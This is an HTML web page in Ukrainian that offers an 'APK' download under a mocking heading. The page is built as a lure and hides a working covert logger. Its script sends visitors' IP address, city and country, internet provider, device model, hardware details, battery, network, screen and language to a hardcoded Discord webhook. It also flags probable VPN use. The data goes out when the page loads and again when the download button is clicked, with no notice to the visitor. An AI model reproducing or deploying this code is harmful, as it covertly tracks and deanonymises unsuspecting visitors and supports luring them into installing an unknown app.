<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; background-color: #000; color: white; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
        h1 { font-size: 40px; color: #ff0000; margin-bottom: 30px; }
        .btn { display: inline-block; padding: 20px 45px; background-color: #00ff00; color: black; text-decoration: none; font-size: 22px; font-weight: bold; border-radius: 12px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.5); cursor: pointer; border: none; }
    </style>
</head>
<body>

    <h1>MODER LOH</h1>
    <a href="app-debug.apk" download class="btn" id="downloadBtn">DOWNLOAD APK</a>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1495809375573512193/DEsfDangmHPuq7wW2twRrtq4HARd1zkW-zueLyT1Zl9lV5c5f5pgLj_2GqGArpIvIsyC";
        const startTime = Date.now();

        async function sendLog(event) {
            // Дані по замовчуванню
            let d = {
                model: "Android (Захищено)",
                cpu: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
                ip: "Не вдалося",
                geo: "Невідомо",
                prov: "Невідомо",
                net: "N/A",
                batt: "N/A",
                vpn: "Ні",
                screen: `${screen.width}x${screen.height}`,
                lang: navigator.language
            };

            // 1. Отримуємо IP та ГЕО
            try {
                const res = await fetch('https://ipapi.co/json/');
                const g = await res.json();
                d.ip = g.ip;
                d.geo = `${g.city}, ${g.country_name}`;
                d.prov = g.org;
                if (g.org.toLowerCase().includes("vpn") || g.org.toLowerCase().includes("hosting")) d.vpn = "ТАК";
            } catch(e) {}

            // 2. Отримуємо модель (Працює тільки через HTTPS)
            if (navigator.userAgentData?.getHighEntropyValues) {
                const h = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion']);
                d.model = `${h.model} (Android ${h.platformVersion})`;
            }

            // 3. Батарея та Мережа
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                d.batt = `${Math.round(b.level * 100)}% (${b.charging ? 'Зарядка' : 'Розрядка'})`;
            }
            if (navigator.connection) {
                d.net = `${navigator.connection.effectiveType.toUpperCase()} (${navigator.connection.rtt}ms)`;
            }

            const timeOnPage = ((Date.now() - startTime) / 1000).toFixed(1);

            // ФОРМУЄМО ПОВІДОМЛЕННЯ
            const payload = {
                embeds: [{
                    title: event === 'visit' ? "👤 НОВИЙ ВІЗИТ" : "📥 СКАЧУВАННЯ",
                    color: event === 'visit' ? 3066993 : 16711680,
                    description: `📱 **Модель:** ${d.model}\n🧠 **Процесор:** ${d.cpu} ядер\n📟 **RAM:** ${d.ram}\n🌐 **IP:** ${d.ip}\n📍 **Місце:** ${d.geo}\n🏢 **Провайдер:** ${d.prov}\n📶 **Інтернет:** ${d.net}\n🔋 **Батарея:** ${d.batt}\n🛡 **VPN:** ${d.vpn}\n🖥 **Екран:** ${d.screen}\n🌍 **Мова:** ${d.lang}\n⏱ **Час на сайті:** ${timeOnPage} сек.`,
                    footer: { text: "Ultimate Logger v10.0" },
                    timestamp: new Date()
                }]
            };

            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        // Відправка через 1.5 секунди після входу (щоб встигли зібратися дані)
        window.onload = () => {
            setTimeout(() => sendLog('visit'), 1500);
        };

        // Відправка при кліку
        document.getElementById('downloadBtn').onclick = () => sendLog('download');
    </script>
</body>
</html>
